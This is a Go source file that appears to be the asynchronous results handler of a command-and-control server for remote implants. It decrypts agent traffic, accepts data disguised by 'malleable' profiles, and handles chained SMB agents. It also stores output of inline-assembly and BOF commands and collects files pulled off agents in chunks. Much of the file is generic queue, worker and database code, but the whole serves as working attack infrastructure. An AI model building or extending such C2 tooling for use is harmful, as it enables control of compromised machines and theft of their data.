// internal/agent/listeners/handler_async.go
package listeners

import (
	"c2/internal/common/config"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ResultBatch represents a batch of results to process
type ResultBatch struct {
	AgentID    string
	Results    []map[string]interface{}
	Connection *ActiveConnection
	Timestamp  time.Time
	Priority   int // Higher priority for smaller batches
}

// ProcessingMetrics tracks enhanced metrics
type ProcessingMetrics struct {
	ItemsProcessed   atomic.Uint64
	BatchesProcessed atomic.Uint64
	AvgBatchSize     atomic.Uint64
	LastProcessTime  atomic.Value
	Errors           atomic.Uint64
	QueueDepth       atomic.Int32
}

// PriorityQueue manages items by priority
type PriorityQueue struct {
	high   []ResultBatch
	normal []ResultBatch
	low    []ResultBatch
	mu     sync.RWMutex
	config *PriorityQueueConfig
}

// PriorityQueueConfig holds priority queue configuration
type PriorityQueueConfig struct {
	HighPriorityThreshold   int
	NormalPriorityThreshold int
	ProcessInterval         time.Duration
}

// AsyncHandler wraps the Manager with async capabilities
type AsyncHandler struct {
	*Manager
	batchChannel   chan *ResultBatch
	workers        sync.WaitGroup
	shutdownChan   chan struct{}
	config         *config.ProcessorConfig
	pendingBatches sync.Map
	activeWorkers  atomic.Int32
	priorityQueue  *PriorityQueue
	metrics        *ProcessingMetrics
}

// NewAsyncHandler creates a handler with async processing
func NewAsyncHandler(m *Manager, cfg *config.ProcessorConfig) *AsyncHandler {
	if cfg == nil {
		cfg = config.DefaultProcessorConfig()
	}

	ah := &AsyncHandler{
		Manager:      m,
		batchChannel: make(chan *ResultBatch, cfg.MaxQueueSize),
		shutdownChan: make(chan struct{}),
		config:       cfg,
	}

	// Start batch workers
	for i := 0; i < cfg.MinWorkers; i++ {
		ah.workers.Add(1)
		go ah.batchWorker(i)
	}

	// Start dynamic scaling
	go ah.dynamicScaler()

	log.Printf("[AsyncHandler] Initialized with %d workers, queue size %d",
		cfg.MinWorkers, cfg.MaxQueueSize)

	return ah
}

// EnhanceAsyncHandler adds priority queue capabilities
func EnhanceAsyncHandler(ah *AsyncHandler) {
	// Use default configuration
	config := &PriorityQueueConfig{
		HighPriorityThreshold:   8,
		NormalPriorityThreshold: 4,
		ProcessInterval:         100 * time.Millisecond,
	}

	// Add priority queue with configuration
	ah.priorityQueue = NewPriorityQueueWithConfig(config)

	// Add enhanced metrics
	ah.metrics = &ProcessingMetrics{}

	// Start additional workers for priority processing
	for i := 0; i < 2; i++ {
		ah.workers.Add(1)
		go ah.priorityWorker(i, config.ProcessInterval)
	}

	log.Printf("[AsyncHandler] Enhanced with priority queue processing")
}

// NewPriorityQueueWithConfig creates a priority queue with configuration
func NewPriorityQueueWithConfig(config *PriorityQueueConfig) *PriorityQueue {
	return &PriorityQueue{
		high:   make([]ResultBatch, 0),
		normal: make([]ResultBatch, 0),
		low:    make([]ResultBatch, 0),
		config: config,
	}
}

// Add adds an item to the appropriate priority queue
func (pq *PriorityQueue) Add(batch ResultBatch) {
	pq.mu.Lock()
	defer pq.mu.Unlock()

	switch {
	case batch.Priority >= pq.config.HighPriorityThreshold:
		pq.high = append(pq.high, batch)
	case batch.Priority >= pq.config.NormalPriorityThreshold:
		pq.normal = append(pq.normal, batch)
	default:
		pq.low = append(pq.low, batch)
	}
}

// DrainHigh returns and clears high priority items
func (pq *PriorityQueue) DrainHigh() []ResultBatch {
	pq.mu.Lock()
	defer pq.mu.Unlock()

	items := make([]ResultBatch, len(pq.high))
	copy(items, pq.high)
	pq.high = pq.high[:0]
	return items
}

// DrainNormal returns and clears normal priority items
func (pq *PriorityQueue) DrainNormal() []ResultBatch {
	pq.mu.Lock()
	defer pq.mu.Unlock()

	items := make([]ResultBatch, len(pq.normal))
	copy(items, pq.normal)
	pq.normal = pq.normal[:0]
	return items
}

// DrainLow returns and clears low priority items
func (pq *PriorityQueue) DrainLow() []ResultBatch {
	pq.mu.Lock()
	defer pq.mu.Unlock()

	items := make([]ResultBatch, len(pq.low))
	copy(items, pq.low)
	pq.low = pq.low[:0]
	return items
}

// GetSizes returns the size of each priority queue
func (pq *PriorityQueue) GetSizes() map[string]int {
	pq.mu.RLock()
	defer pq.mu.RUnlock()

	return map[string]int{
		"high":   len(pq.high),
		"normal": len(pq.normal),
		"low":    len(pq.low),
		"total":  len(pq.high) + len(pq.normal) + len(pq.low),
	}
}

// priorityWorker processes high-priority batches
func (ah *AsyncHandler) priorityWorker(id int, processInterval time.Duration) {
	defer ah.workers.Done()

	ticker := time.NewTicker(processInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ah.shutdownChan:
			return
		case <-ticker.C:
			ah.processPriorityBatches()
		}
	}
}

// processPriorityBatches handles priority queue processing
func (ah *AsyncHandler) processPriorityBatches() {
	if ah.priorityQueue == nil {
		return
	}

	// Process high priority first
	highPriority := ah.priorityQueue.DrainHigh()
	for _, batch := range highPriority {
		ah.processBatch(&batch)
	}

	// Process normal priority if workers available
	if ah.activeWorkers.Load() < int32(ah.config.MaxWorkers/2) {
		normalPriority := ah.priorityQueue.DrainNormal()
		for _, batch := range normalPriority {
			ah.processBatch(&batch)
		}
	}

	// Process low priority if queue is empty
	if len(ah.batchChannel) == 0 {
		lowPriority := ah.priorityQueue.DrainLow()
		for _, batch := range lowPriority[:min(len(lowPriority), 5)] { // Process max 5 low priority at a time
			ah.processBatch(&batch)
		}
	}
}

// GetEnhancedMetrics returns detailed processing metrics
func (ah *AsyncHandler) GetEnhancedMetrics() map[string]interface{} {
	if ah.metrics == nil || ah.priorityQueue == nil {
		return ah.GetMetrics() // Fall back to basic metrics
	}

	queueSizes := ah.priorityQueue.GetSizes()
	lastProcess, _ := ah.metrics.LastProcessTime.Load().(time.Duration)

	return map[string]interface{}{
		"items_processed":   ah.metrics.ItemsProcessed.Load(),
		"batches_processed": ah.metrics.BatchesProcessed.Load(),
		"avg_batch_size":    ah.metrics.AvgBatchSize.Load(),
		"last_process_time": lastProcess,
		"errors":            ah.metrics.Errors.Load(),
		"queue_depth":       ah.metrics.QueueDepth.Load(),
		"priority_queues":   queueSizes,
		"active_workers":    ah.activeWorkers.Load(),
		"config": map[string]interface{}{
			"max_workers":     ah.config.MaxWorkers,
			"min_workers":     ah.config.MinWorkers,
			"queue_size":      ah.config.MaxQueueSize,
			"batch_size":      ah.config.BatchSize,
			"async_threshold": ah.config.AsyncThreshold,
		},
	}
}

// handleActiveConnectionAsync processes results asynchronously
// postProfile is optional - if nil, uses legacy JSON body parsing
func (ah *AsyncHandler) handleActiveConnectionAsync(w http.ResponseWriter, r *http.Request, conn *ActiveConnection, postProfile *config.PostProfile) {
	startTime := time.Now()
	log.Printf("[Async] Processing request for agent %s", conn.ClientID)

	// Extract POST body data - supports malleable transforms via DataBlock
	var encryptedDataB64 string

	if postProfile != nil && postProfile.Data != nil {
		// Use DataBlock extraction with transform reversal
		// Uses static profile XOR key - agent has matching key embedded at build time
		basePath := postProfile.Path
		bodyData, err := ah.Manager.extractDataFromDataBlock(r, postProfile.Data, basePath, "")
		if err != nil {
			log.Printf("[Async] Failed to extract body via DataBlock: %v", err)
			http.Error(w, "Bad Request", http.StatusBadRequest)
			return
		}
		encryptedDataB64 = string(bodyData)
		log.Printf("[Async] Extracted data via DataBlock from %s", postProfile.Data.Output)
	} else {
		// Legacy: Read and parse JSON body
		var postData struct {
			Data    string `json:"data"`
			AgentID string `json:"agent_id"`
		}

		if err := json.NewDecoder(r.Body).Decode(&postData); err != nil {
			log.Printf("[Async] Failed to decode request: %v", err)
			http.Error(w, "Bad Request", http.StatusBadRequest)
			return
		}
		encryptedDataB64 = postData.Data
	}

	// Decrypt the data
	plaintext, err := ah.decryptAgentData(encryptedDataB64, conn.Secret1)
	if err != nil {
		log.Printf("[Async] Decryption failed: %v", err)
		http.Error(w, "Decryption failed", http.StatusBadRequest)
		return
	}

	// Parse the decrypted data
	var decryptedData struct {
		AgentID             string                   `json:"agent_id"`
		Results             []map[string]interface{} `json:"results"`
		LinkData            []interface{}            `json:"ld"` // Link data from connected SMB agents
		LinkHandshake       map[string]interface{}   `json:"lh"` // Link handshake from new SMB/TCP agent
		UnlinkNotifications []interface{}            `json:"lu"` // Unlink notifications (routing IDs)
	}

	if err := json.Unmarshal(plaintext, &decryptedData); err != nil {
		log.Printf("[Async] Failed to parse decrypted data: %v", err)
		http.Error(w, "Invalid data format", http.StatusBadRequest)
		return
	}

	resultCount := len(decryptedData.Results)
	log.Printf("[Async] Received %d results from agent %s", resultCount, conn.ClientID)

	// Process link data if present (from connected SMB agents)
	if len(decryptedData.LinkData) > 0 {
		log.Printf("[Async] Processing %d link data items from edge agent %s", len(decryptedData.LinkData), conn.ClientID)
		ctx := context.Background()
		tx, err := ah.db.BeginTx(ctx, nil)
		if err != nil {
			log.Printf("[Async] Failed to begin transaction for link data: %v", err)
		} else {
			if err := ah.Manager.processLinkData(ctx, tx, conn.ClientID, decryptedData.LinkData); err != nil {
				log.Printf("[Async] Failed to process link data: %v", err)
				tx.Rollback()
			} else {
				tx.Commit()
			}
		}
	}

	// Process link handshake if present (new SMB/TCP agent connecting)
	if decryptedData.LinkHandshake != nil && len(decryptedData.LinkHandshake) > 0 {
		log.Printf("[Async] Processing link handshake from edge agent %s", conn.ClientID)
		ctx := context.Background()
		response, err := ah.Manager.processLinkHandshake(ctx, conn.ClientID, decryptedData.LinkHandshake)
		if err != nil {
			log.Printf("[Async] Link handshake failed: %v", err)
		} else if response != nil {
			ah.Manager.storeLinkHandshakeResponse(conn.ClientID, response)
			log.Printf("[Async] Link handshake processed, response queued for edge agent %s", conn.ClientID)
		}
	}

	// Process unlink notifications if present (when edge agent disconnects from SMB agent)
	if len(decryptedData.UnlinkNotifications) > 0 {
		log.Printf("[Async] Processing %d unlink notifications from edge agent %s", len(decryptedData.UnlinkNotifications), conn.ClientID)
		ctx := context.Background()
		ah.Manager.processUnlinkNotifications(ctx, conn.ClientID, decryptedData.UnlinkNotifications)
	}

	// Update metrics if available
	if ah.metrics != nil {
		ah.metrics.QueueDepth.Store(int32(len(ah.batchChannel)))
	}

	// Immediately rotate secrets (don't wait for DB processing)
	ah.rotateSecrets(conn)

	// Determine priority based on result count
	priority := 5 // Default normal priority
	if resultCount <= 5 {
		priority = 9 // High priority for small batches
	} else if resultCount > ah.config.AsyncThreshold*2 {
		priority = 2 // Low priority for very large batches
	}

	// Determine processing strategy based on result count
	if resultCount > ah.config.AsyncThreshold {
		// Large payload - fully async processing
		log.Printf("[Async] Large payload detected (%d results), using async processing", resultCount)

		// Queue for async processing
		batch := &ResultBatch{
			AgentID:    decryptedData.AgentID,
			Results:    decryptedData.Results,
			Connection: conn,
			Timestamp:  time.Now(),
			Priority:   priority,
		}

		// Try priority queue first if available
		if ah.priorityQueue != nil {
			ah.priorityQueue.Add(*batch)
			log.Printf("[Async] Added batch to priority queue (priority: %d)", priority)
		} else {
			// Fall back to regular queue
			select {
			case ah.batchChannel <- batch:
				log.Printf("[Async] Queued batch of %d results for agent %s", resultCount, conn.ClientID)
			case <-time.After(100 * time.Millisecond):
				// Queue is full, process synchronously but still send immediate response
				log.Printf("[Async] Queue full, processing inline for agent %s", conn.ClientID)
				go ah.processBatchInline(batch)
			}
		}

		// Immediately broadcast preliminary status to WebSocket
		ah.broadcastPreliminaryStatus(decryptedData.AgentID, resultCount)

		// Send immediate success response to agent
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":    "success",
			"queued":    true,
			"count":     resultCount,
			"timestamp": time.Now().Unix(),
		})

	} else {
		// Small payload - process quickly inline but still async DB writes
		log.Printf("[Async] Small payload (%d results), using hybrid processing", resultCount)

		// Process WebSocket notifications immediately
		for _, result := range decryptedData.Results {
			ah.broadcastResultImmediate(decryptedData.AgentID, result)
		}

		// Queue database writes asynchronously
		go ah.processDBWritesAsync(decryptedData.AgentID, decryptedData.Results, conn)

		// Send immediate response
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{
			"status": "success",
		})
	}

	// Update metrics
	if ah.metrics != nil {
		ah.metrics.ItemsProcessed.Add(uint64(resultCount))
	}

	log.Printf("[Async] Request handled in %v for agent %s", time.Since(startTime), conn.ClientID)
}

// Rest of the methods remain the same...
// decryptAgentData, rotateSecrets, updateSecretsAsync, broadcastPreliminaryStatus,
// broadcastResultImmediate, processDBWritesAsync, processResultToDB, batchWorker,
// processBatch, processBatchInline, dynamicScaler, Shutdown

// decryptAgentData handles the decryption logic
func (ah *AsyncHandler) decryptAgentData(data string, secret string) ([]byte, error) {
	secretHash := sha256.Sum256([]byte(secret))

	ciphertext, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v", err)
	}

	block, err := aes.NewCipher(secretHash[:])
	if err != nil {
		return nil, fmt.Errorf("cipher creation failed: %v", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("GCM creation failed: %v", err)
	}

	nonceSize := aesGCM.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce := ciphertext[:nonceSize]
	encryptedData := ciphertext[nonceSize:]

	return aesGCM.Open(nil, nonce, encryptedData, nil)
}

// rotateSecrets performs secret rotation
func (ah *AsyncHandler) rotateSecrets(conn *ActiveConnection) {
	h := hmac.New(sha256.New, []byte(conn.Secret2))
	h.Write([]byte(conn.Secret1))
	newSecret := fmt.Sprintf("%x", h.Sum(nil))

	conn.Secret2 = conn.Secret1
	conn.Secret1 = newSecret

	// Update in database asynchronously
	go ah.updateSecretsAsync(conn.ClientID, conn.Secret1, conn.Secret2)
}

// updateSecretsAsync updates secrets in database without blocking
func (ah *AsyncHandler) updateSecretsAsync(clientID, secret1, secret2 string) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := ah.db.ExecContext(ctx, `
		UPDATE connections 
		SET secret1 = $1, secret2 = $2, lastSEEN = CURRENT_TIMESTAMP
		WHERE newclientID = $3`,
		secret1, secret2, clientID)

	if err != nil {
		log.Printf("[Async] Failed to update secrets for %s: %v", clientID, err)
	} else {
		log.Printf("[Async] Secrets updated for %s", clientID)
	}
}

// broadcastPreliminaryStatus sends immediate status update to WebSocket
func (ah *AsyncHandler) broadcastPreliminaryStatus(agentID string, resultCount int) {
	status := map[string]interface{}{
		"agent_id":     agentID,
		"status":       "processing",
		"result_count": resultCount,
		"message":      fmt.Sprintf("Processing %d results...", resultCount),
		"timestamp":    time.Now().Format(time.RFC3339),
	}

	if err := ah.commandBuffer.BroadcastResult(status); err != nil {
		log.Printf("[Async] Failed to broadcast preliminary status: %v", err)
	}
}

// broadcastResultImmediate sends result to WebSocket immediately
func (ah *AsyncHandler) broadcastResultImmediate(agentID string, result map[string]interface{}) {
	command, _ := result["command"].(string)
	commandDBID, _ := result["command_db_id"].(float64)
	output, _ := result["output"].(string)

	// Determine result type
	resultType := "command_result"
	if strings.HasPrefix(command, "inline-assembly") {
		resultType = "inline_assembly_result"
	} else if strings.Contains(output, "BOF_ASYNC_") {
		resultType = "bof_async_result"
	}

	commandResult := map[string]interface{}{
		"agent_id":   agentID,
		"command_id": fmt.Sprintf("%d", int(commandDBID)),
		"output":     output,
		"timestamp":  time.Now().Format(time.RFC3339),
		"status":     "completed",
		"type":       resultType,
	}

	if err := ah.commandBuffer.BroadcastResult(commandResult); err != nil {
		log.Printf("[Async] Failed to broadcast result: %v", err)
	}
}

// processDBWritesAsync handles database writes asynchronously
// processDBWritesAsync handles database writes asynchronously
func (ah *AsyncHandler) processDBWritesAsync(agentID string, results []map[string]interface{}, conn *ActiveConnection) {
	for _, result := range results {
		command, _ := result["command"].(string)
		filename, _ := result["filename"].(string)
		currentChunk, _ := result["currentChunk"].(float64)
		totalChunks, _ := result["totalChunks"].(float64)
		data, _ := result["data"].(string)
		commandDBID, _ := result["command_db_id"].(float64)

		// Handle UPLOAD commands
		if strings.HasPrefix(command, "upload") && filename != "" {
			log.Printf("[Async] Processing upload result for chunk %d/%d of file %s",
				int(currentChunk), int(totalChunks), filename)

			// Queue next upload chunk if not the last one
			if int(currentChunk) < int(totalChunks)-1 {
				chunkDir := filepath.Join("/app/temp", filename)
				log.Printf("[Async] Attempting to queue next chunk from directory: %s", chunkDir)

				if ah.Manager != nil && ah.Manager.commandBuffer != nil {
					if err := ah.Manager.commandBuffer.QueueUploadNextChunk(agentID, chunkDir); err != nil {
						log.Printf("[Async] ERROR: Failed to queue next upload chunk: %v", err)
						// Check if directory exists
						if _, statErr := os.Stat(chunkDir); os.IsNotExist(statErr) {
							log.Printf("[Async] ERROR: Chunk directory does not exist: %s", chunkDir)
						}
					} else {
						log.Printf("[Async] Successfully queued next upload chunk %d/%d for %s",
							int(currentChunk)+2, int(totalChunks), filename)
					}
				} else {
					log.Printf("[Async] ERROR: commandBuffer not available for upload")
				}
			} else {
				// THIS IS THE ADDITION: Clean up temp directory when upload is complete
				log.Printf("[Async] Upload complete - received confirmation for final chunk %d/%d of %s",
					int(currentChunk)+1, int(totalChunks), filename)

				// Clean up the temp directory
				chunkDir := filepath.Join("/app/temp", filename)
				if err := os.RemoveAll(chunkDir); err != nil {
					log.Printf("[Async] Warning: Failed to clean up chunk directory %s: %v", chunkDir, err)
				} else {
					log.Printf("[Async] Successfully cleaned up chunk directory: %s", chunkDir)
				}
			}
		}

		// Handle DOWNLOAD commands
		if strings.HasPrefix(command, "download") && filename != "" && data != "" {
			log.Printf("[Async] Processing download chunk %d/%d for file %s (data_len=%d)",
				int(currentChunk), int(totalChunks), filename, len(data))

			// Use the Manager's downloadTracker (AsyncHandler embeds *Manager)
			if ah.Manager != nil && ah.Manager.downloadTracker != nil {
				chunk := DownloadChunk{
					Filename:     filename,
					CurrentChunk: int(currentChunk),
					TotalChunks:  int(totalChunks),
					Data:         data,
				}

				if err := ah.Manager.downloadTracker.handleDownloadChunk(chunk); err != nil {
					log.Printf("[Async] Failed to handle download chunk: %v", err)
				} else {
					log.Printf("[Async] Successfully processed download chunk %d/%d",
						int(currentChunk), int(totalChunks))

					// Queue next chunk if not the last one
					if int(currentChunk) < int(totalChunks) {
						nextCmd := map[string]interface{}{
							"command":       "download",
							"command_db_id": int(commandDBID),
							"agent_id":      agentID,
							"filename":      filename,
							"currentChunk":  int(currentChunk) + 1,
							"totalChunks":   int(totalChunks),
							"timestamp":     time.Now().Format("2006-01-02T15:04:05.000000"),
						}

						log.Printf("[Async] Queueing next download chunk %d/%d",
							int(currentChunk)+1, int(totalChunks))

						if ah.Manager.commandBuffer != nil {
							if err := ah.Manager.commandBuffer.QueueDownloadCommand(agentID, nextCmd); err != nil {
								log.Printf("[Async] Failed to queue next download chunk: %v", err)
							} else {
								log.Printf("[Async] Successfully queued next download chunk")
							}
						}
					} else {
						log.Printf("[Async] Download complete for file %s", filename)
					}
				}
			} else {
				log.Printf("[Async] ERROR: downloadTracker not available")
			}
		}
	}

	// Continue with the database writes
	ctx, cancel := context.WithTimeout(context.Background(), ah.config.DBTimeout)
	defer cancel()

	tx, err := ah.db.BeginTx(ctx, &sql.TxOptions{
		Isolation: sql.LevelReadCommitted,
	})
	if err != nil {
		log.Printf("[Async] Failed to begin transaction: %v", err)
		return
	}
	defer tx.Rollback()

	// Prepare batch insert statement
	stmt, err := tx.PrepareContext(ctx, `
		INSERT INTO command_outputs (command_id, output, timestamp)
		VALUES ($1, $2, CURRENT_TIMESTAMP)`)
	if err != nil {
		log.Printf("[Async] Failed to prepare statement: %v", err)
		return
	}
	defer stmt.Close()

	// Process each result
	for _, result := range results {
		if err := ah.processResultToDB(ctx, stmt, result); err != nil {
			log.Printf("[Async] Failed to process result: %v", err)
			// Continue with other results
		}
	}

	// Update last seen
	if _, err := tx.ExecContext(ctx, `
		UPDATE connections 
		SET lastSEEN = CURRENT_TIMESTAMP 
		WHERE newclientid = $1`, agentID); err != nil {
		log.Printf("[Async] Failed to update last seen: %v", err)
	}

	// Commit transaction
	if err := tx.Commit(); err != nil {
		log.Printf("[Async] Failed to commit transaction: %v", err)
		if ah.metrics != nil {
			ah.metrics.Errors.Add(1)
		}
	} else {
		log.Printf("[Async] Successfully stored %d results for agent %s", len(results), agentID)
		if ah.metrics != nil {
			ah.metrics.BatchesProcessed.Add(1)
		}
	}
}

// processResultToDB writes a single result to database
func (ah *AsyncHandler) processResultToDB(ctx context.Context, stmt *sql.Stmt, result map[string]interface{}) error {
	commandDBID, ok := result["command_db_id"].(float64)
	if !ok {
		return fmt.Errorf("missing command_db_id")
	}

	output, _ := result["output"].(string)
	command, _ := result["command"].(string)

	// Format output based on command type
	if strings.HasPrefix(command, "upload") || strings.HasPrefix(command, "download") {
		// Handle file operation progress
		currentChunk, _ := result["currentChunk"].(float64)
		totalChunks, _ := result["totalChunks"].(float64)
		filename, _ := result["filename"].(string)

		output = fmt.Sprintf("%s chunk %d/%d of %s",
			strings.Split(command, " ")[0],
			int(currentChunk), int(totalChunks), filename)
	}

	_, err := stmt.ExecContext(ctx, int(commandDBID), output)
	return err
}

// batchWorker processes batches from the queue
func (ah *AsyncHandler) batchWorker(id int) {
	defer ah.workers.Done()

	log.Printf("[BatchWorker-%d] Started", id)

	for {
		select {
		case <-ah.shutdownChan:
			log.Printf("[BatchWorker-%d] Shutting down", id)
			return

		case batch := <-ah.batchChannel:
			if batch == nil {
				continue
			}

			ah.activeWorkers.Add(1)
			startTime := time.Now()
			ah.processBatch(batch)
			ah.activeWorkers.Add(-1)

			// Update metrics
			if ah.metrics != nil {
				processingTime := time.Since(startTime)
				ah.metrics.LastProcessTime.Store(processingTime)

				// Update average batch size
				currentAvg := ah.metrics.AvgBatchSize.Load()
				newAvg := (currentAvg*9 + uint64(len(batch.Results))) / 10
				ah.metrics.AvgBatchSize.Store(newAvg)
			}

			log.Printf("[BatchWorker-%d] Processed batch of %d results in %v",
				id, len(batch.Results), time.Since(startTime))
		}
	}
}

// processBatch handles a batch of results
func (ah *AsyncHandler) processBatch(batch *ResultBatch) {
	// First, send all results to WebSocket immediately
	for _, result := range batch.Results {
		ah.broadcastResultImmediate(batch.AgentID, result)

		// Small delay to prevent WebSocket flooding
		if len(batch.Results) > 100 {
			time.Sleep(10 * time.Millisecond)
		}
	}

	// Then process database writes in chunks
	chunkSize := ah.config.BatchSize
	for i := 0; i < len(batch.Results); i += chunkSize {
		end := min(i+chunkSize, len(batch.Results))
		chunk := batch.Results[i:end]

		ah.processDBWritesAsync(batch.AgentID, chunk, batch.Connection)

		// Delay between chunks to prevent DB overload
		if end < len(batch.Results) {
			time.Sleep(ah.config.BatchDelay)
		}
	}
}

// processBatchInline handles inline processing when queue is full
func (ah *AsyncHandler) processBatchInline(batch *ResultBatch) {
	log.Printf("[Async] Processing batch inline for agent %s", batch.AgentID)
	ah.processBatch(batch)
}

// dynamicScaler adjusts worker count based on queue depth
func (ah *AsyncHandler) dynamicScaler() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	currentWorkers := ah.config.MinWorkers

	for {
		select {
		case <-ah.shutdownChan:
			return

		case <-ticker.C:
			queueLen := len(ah.batchChannel)
			queueCapacity := cap(ah.batchChannel)
			utilizationPct := float64(queueLen) / float64(queueCapacity) * 100

			// Scale up if queue is more than 50% full
			if utilizationPct > 50 && currentWorkers < ah.config.MaxWorkers {
				newWorkers := min(currentWorkers+2, ah.config.MaxWorkers)
				for i := currentWorkers; i < newWorkers; i++ {
					ah.workers.Add(1)
					go ah.batchWorker(i)
				}
				log.Printf("[Async] Scaled up to %d workers (queue: %d/%d, %.1f%%)",
					newWorkers, queueLen, queueCapacity, utilizationPct)
				currentWorkers = newWorkers
			}

			// Log queue status if not empty
			if queueLen > 0 {
				log.Printf("[Async] Queue status: %d/%d (%.1f%%), Workers: %d",
					queueLen, queueCapacity, utilizationPct, currentWorkers)
			}
		}
	}
}

// Shutdown gracefully shuts down the async handler
func (ah *AsyncHandler) Shutdown(timeout time.Duration) error {
	log.Println("[AsyncHandler] Shutting down...")

	// Signal shutdown
	close(ah.shutdownChan)

	// Wait for workers with timeout
	done := make(chan struct{})
	go func() {
		ah.workers.Wait()
		close(done)
	}()

	select {
	case <-done:
		log.Println("[AsyncHandler] All workers finished")
		return nil
	case <-time.After(timeout):
		remaining := len(ah.batchChannel)
		return fmt.Errorf("shutdown timeout with %d batches remaining", remaining)
	}
}

// GetMetrics returns basic metrics (for backward compatibility)
func (ah *AsyncHandler) GetMetrics() map[string]interface{} {
	return map[string]interface{}{
		"queue_depth":    len(ah.batchChannel),
		"queue_capacity": cap(ah.batchChannel),
		"active_workers": ah.activeWorkers.Load(),
	}
}

// Helper function for min
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
